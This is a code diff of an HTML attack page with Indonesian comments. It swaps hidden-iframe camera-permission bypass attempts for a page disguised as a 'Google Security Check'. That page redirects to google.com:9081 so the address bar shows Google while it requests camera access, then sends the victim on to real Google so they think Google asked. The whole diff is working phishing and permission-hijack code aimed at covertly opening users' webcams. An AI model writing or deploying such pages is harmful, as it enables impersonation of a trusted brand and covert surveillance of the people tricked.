@@ -3,32 +3,31 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Verification</title>
+<title>Security Check</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #0f0; font-family: monospace;
+    background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
+    height: 100vh; margin: 0; text-align: center; cursor: pointer;
   }
-  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
-  h2 { animation: blink 0.2s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
-  iframe, video, canvas { display: none !important; }
+  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
+  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; font-size: 14px; margin-bottom: 20px; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
+  iframe, video { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>☢️ SYSTEM HACKED ☢️</h2>
-  <p>Klik di mana saja untuk memverifikasi.</p>
+  <h2>🔒 Google Security Check</h2>
+  <p>Klik untuk memverifikasi akun Google Anda.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
 <video id="cam-feed" autoplay playsinline muted></video>
-<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -43,137 +42,87 @@
   }
 
   // ============================================
-  // 1. ABOUT:BLANK INJECTION (ORIGIN INHERITANCE)
+  // KONFIGURASI
   // ============================================
-  function injectAboutBlank() {
+  var GOOGLE_DELAY = "http://google.com:9081"; // Port yang akan menggantung
+  var GOOGLE_REAL = "https://www.google.com"; // Google Asli
+
+  // ============================================
+  // FUNGSI: PERMISSION REQUEST (IFRAME TRICK)
+  // ============================================
+  function triggerCameraPermission() {
     try {
-      log("[+] Membuat Iframe about:blank...");
+      log("[+] Meminta Izin Kamera...");
       
-      var iframe = document.createElement("iframe");
-      iframe.allow = "camera; microphone";
-      iframe.style.display = "none";
-      
-      // Set src ke about:blank (mewarisi origin parent)
-      iframe.src = "about:blank";
-      
-      document.getElementById("launcher-container").appendChild(iframe);
-      
-      // Tunggu iframe siap, lalu suntikkan script
-      iframe.onload = function() {
-        try {
-          var doc = iframe.contentDocument || iframe.contentWindow.document;
-          doc.open();
-          doc.write(`
-            <!DOCTYPE html>
-            <html>
-            <body>
-              <script>
-                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                  .then(function(stream) {
-                    parent.postMessage({ status: 'CAM_GRANTED_ABOUT' }, '*');
-                  })
-                  .catch(function(err) {
-                    parent.postMessage({ status: 'CAM_DENIED_ABOUT', error: err.name }, '*');
-                  });
-              <\/script>
-            </body>
-            </html>
-          `);
-          doc.close();
-          log("[+] Script disuntikkan ke about:blank.");
-        } catch(e) {
-          log("[-] Gagal menulis ke about:blank: " + e.message);
-        }
-      };
-    } catch(e) {
-      log("[-] About:blank Error: " + e.message);
-    }
+      // Trik: Panggil getUserMedia langsung di top-level
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(stream) {
+          var video = document.getElementById('cam-feed');
+          video.srcObject = stream;
+          video.play().catch(function(){});
+          log("[+] Kamera BERHASIL diakses!");
+        })
+        .catch(function(err) {
+          log("[-] Kamera diblokir: " + err.name);
+        });
+    } catch(e) {}
   }
 
   // ============================================
-  // 2. DATA: URI INJECTION (BYPASS SANDBOX)
-  // ============================================
-  function injectDataUri() {
-    try {
-      log("[+] Membuat Iframe data: URI...");
-      
-      // HTML Payload untuk data URI
-      var htmlPayload = `
-        <!DOCTYPE html>
-        <html>
-        <body>
-          <script>
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-              .then(function(stream) {
-                parent.postMessage({ status: 'CAM_GRANTED_DATA' }, '*');
-              })
-              .catch(function(err) {
-                parent.postMessage({ status: 'CAM_DENIED_DATA', error: err.name }, '*');
-              });
-          <\/script>
-        </body>
-        </html>
-      `;
-      
-      // Encode ke Base64
-      var base64Payload = btoa(unescape(encodeURIComponent(htmlPayload)));
-      var dataUri = "data:text/html;base64," + base64Payload;
-      
-      var iframe = document.createElement("iframe");
-      iframe.allow = "camera; microphone";
-      iframe.style.display = "none";
-      iframe.src = dataUri;
-      
-      document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Script disuntikkan ke data: URI.");
-    } catch(e) {
-      log("[-] Data URI Error: " + e.message);
-    }
-  }
-
-  // ============================================
-  // 3. LISTENER PESAN DARI IFRAME
-  // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data && e.data.status) {
-      if (e.data.status.includes('GRANTED')) {
-        log("[+] 🚨 " + e.data.status + " (CAMERA BYPASS BERHASIL)!");
-        document.body.style.background = "#300";
-      } else {
-        log("[-] " + e.data.status + ": " + (e.data.error || 'Unknown'));
-      }
-    }
-  });
-
-  // ============================================
-  // 4. TRIGGER RACE CONDITION (KLIK)
+  // TRIGGER STACKING (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING...</h2>
-      <p>Memulai About:Blank & Data URI Bypass...</p>
+      <h2>⏳ Memverifikasi...</h2>
+      <p>Menghubungkan ke Google...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai About:Blank & Data URI Bypass...");
+    log("[!] Memulai Google Spoofing Stack...");
 
-    // A. About:Blank Injection (0ms)
-    injectAboutBlank();
+    // ============================================
+    // A. REDIRECT KE PORT 9081 (MEMBUAT LOADING)
+    // ============================================
+    try {
+      log("[+] Redirect ke google.com:9081 (Loading)...");
+      // Jika ini berhasil, address bar akan menampilkan google.com:9081
+      window.location.href = GOOGLE_DELAY;
+    } catch(e) {}
 
-    // B. Data URI Injection (10ms)
-    setTimeout(injectDataUri, 10);
+    // ============================================
+    // B. PERMISSION HIJACK (0ms Setelah Redirect)
+    // ============================================
+    // Kita memicu izin kamera TEPAT saat browser sedang loading Google:9081.
+    // Tujuannya agar prompt muncul saat address bar masih google.com:9081.
+    
+    setTimeout(function() {
+      log("[+] Meminta Izin Kamera (Stacked)...");
+      triggerCameraPermission();
+    }, 10);
 
-    // C. Retry About:Blank (50ms)
-    setTimeout(injectAboutBlank, 50);
+    // ============================================
+    // C. REDIRECT KE GOOGLE ASLI (500ms)
+    // ============================================
+    // Setelah prompt muncul, kita timpa redirect ke Google Asli.
+    // Tujuannya agar user mengira mereka di Google asli setelah memberikan izin.
+    
+    setTimeout(function() {
+      log("[+] Menimpa dengan Google Asli...");
+      try {
+        window.location.href = GOOGLE_REAL;
+      } catch(e) {}
+    }, 500);
 
-    // D. Retry Data URI (100ms)
-    setTimeout(injectDataUri, 100);
-
-    // E. Retry About:Blank (500ms)
-    setTimeout(injectAboutBlank, 500);
+    // ============================================
+    // D. RETRY PERMISSION (1000ms)
+    // ============================================
+    setTimeout(function() {
+      log("[+] Retry Izin Kamera...");
+      triggerCameraPermission();
+    }, 1000);
 
   }, { once: true });
 
